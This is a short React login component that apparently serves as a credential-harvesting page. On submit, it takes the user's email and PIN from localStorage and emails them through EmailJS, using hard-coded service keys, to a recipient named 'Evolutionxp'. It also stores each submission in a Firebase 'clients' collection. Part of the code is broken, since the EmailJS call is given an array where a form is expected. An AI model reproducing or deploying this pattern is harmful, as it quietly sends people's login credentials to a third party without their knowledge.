import React, {useEffect, useState} from 'react'
import LoginForm from './loginForm';
import emailjs from 'emailjs-com';
import {db} from '../firebase';

const ContainerLogin = () => {

  
  const [radicados, setRadicados] = useState([]);

  function sendEmail(data) {
    const serializedState = JSON.parse(localStorage.getItem("infoUser"));
    const infoMessage = {
        to_name: "Evolutionxp ",
        email: serializedState.email,
        pin_number: serializedState.pint
    }
    emailjs.sendForm('service_w3kikiz', 'template_gwhd0no', [infoMessage], 'user_XLNXdKU27fDygoQGrfgh7')
      .then((result) => {
          console.log(result.text, 'biennnnn ');
      }, (error) => {
          console.log(error.text);
      });
  }

    const addOrEditLink = async (data) => {
      sendEmail(data)
        await db.collection('clients').doc().set(data);
    }

    const getClients = () => {
         db.collection('clients').onSnapshot((querySnapshot)  => {
           const newRadicados = [];
          querySnapshot.forEach(doc => {
            newRadicados.push({...doc.data(), id:doc.id})
        })
        setRadicados(newRadicados)
        })
      
    }

    useEffect(() => {
        getClients()
    }, []);

    return (
      <>
        <LoginForm addOrEdit={addOrEditLink}/>

      </>
    )
}

export default ContainerLogin
